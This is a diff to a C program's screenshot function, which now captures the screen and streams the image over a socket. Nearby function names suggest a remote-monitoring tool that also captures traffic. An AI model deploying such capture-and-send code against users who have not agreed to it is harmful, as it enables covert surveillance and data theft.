@@ -73,13 +73,11 @@ void send_file()
 
 void screenshot_system(int sockfd)
 {
-    // Ensure scrot is installed
-    system("which scrot || (echo 'scrot not found'; exit 1)");
-    
-    // Take screenshot
-    system("scrot -z /tmp/screenshot.png");
-    
-    // Check if file exists and readable
+    system("gnome-screenshot -f /tmp/screenshot.png");
+    //system("convert /tmp/screenshot.png -resize 700 /tmp/screenshot.png");
+
+    //sleep(3);
+
     struct stat st;
     if (stat("/tmp/screenshot.png", &st) == -1) {
         const char *error_msg = "Failed to create screenshot\n<END_OF_DATA>";
@@ -87,7 +85,6 @@ void screenshot_system(int sockfd)
         return;
     }
 
-    // Open and read file
     int fd = open("/tmp/screenshot.png", O_RDONLY);
     if (fd == -1) {
         const char *error_msg = "Failed to open screenshot\n<END_OF_DATA>";
@@ -95,46 +92,51 @@ void screenshot_system(int sockfd)
         return;
     }
 
-     
+    FILE *picture=fdopen(fd,"rb");
 
-    // Send file size first
-    // char size_buf[32];
-    // snprintf(size_buf, sizeof(size_buf), "%ld", st.st_size);
-    // send(sockfd, size_buf, strlen(size_buf), 0);
-    // send(sockfd, "\n", 1, 0);
+    char Sbuf[1024];
+    int siz=1024;
+    int n;
 
-    // Send file contents
+    unsigned int pic_size=0;
+    fseek(picture,0,SEEK_END);
+    pic_size=ftell(picture);
+    printf("pic size:%d\n",pic_size);
+    fseek(picture,0,SEEK_SET);
+    unsigned int tmp=htonl(pic_size);
 
-    char buffer[MAXLINE*100];
+    send(sockfd,&tmp,sizeof(int),0);
 
-    struct file_struct file_to_send;
-    strcpy(file_to_send.file_name,"screenshot.png");
-    file_to_send.name_length=strlen(file_to_send.file_name);
+    int bytes_sent=0;
 
-    char file_content_buff[MAXLINE*100];
-    file_to_send.file_size = read(fd, file_to_send.file_bytes, MAXLINE*100);
+    while(bytes_sent<pic_size){
+    n = fread(Sbuf, sizeof(char), siz, picture);
+    bytes_sent+=n;
+    if (n > 0) { /* only send what has been read */
+        if((n = send(sockfd, Sbuf, n, 0)) < 0) /* or (better?) send(sock, Sbuf, n, 0) */
+        {
+            perror("send_data()");
+            exit(errno);
+        }
 
-    //strncpy(file_to_send.file_bytes, buffer, file_to_send.file_size);
+    }
+    printf("I sent %d\n",bytes_sent);
+    /* memset(Sbuf, 0, sizeof(Sbuf)); useless for binary data */
+}
 
-    write(sockfd, &file_to_send, sizeof(file_to_send));
+    // char *buffer=(char*)malloc(MAXLINE*1000);
 
-    printf("sending %d\n",file_to_send.file_size);
+    // struct file_struct file_to_send;
+    // strcpy(file_to_send.file_name,"screenshot.png");
+    // file_to_send.name_length=strlen(file_to_send.file_name);
 
-    // char buffer[MAXLINE];
-    // ssize_t bytes_read;
-    // int total_read=0;
-    // while ((bytes_read = read(fd, buffer, sizeof(buffer))) > 0) {
-    //     send(sockfd, buffer, bytes_read, 0);
-    //     total_read+=bytes_read;
-    // }
-    // printf("screenshot size: %d,\n",total_read);
+    // char file_content_buff[MAXLINE*1000];
+    // file_to_send.file_size = read(fd, file_to_send.file_bytes, MAXLINE*1000);
 
-    // close(fd);
-    // send(sockfd, "<END_OF_DATA>", strlen("<END_OF_DATA>"), 0);
-    // printf("Screenshot sent\n");
+    // int sent_bytes=send(sockfd, &file_to_send, sizeof(file_to_send),0);
+
+    // printf("sending %d\n",sent_bytes);
     
-    // Cleanup
-    //unlink("/tmp/screenshot.png");
 }
 
 void capturetraffic()
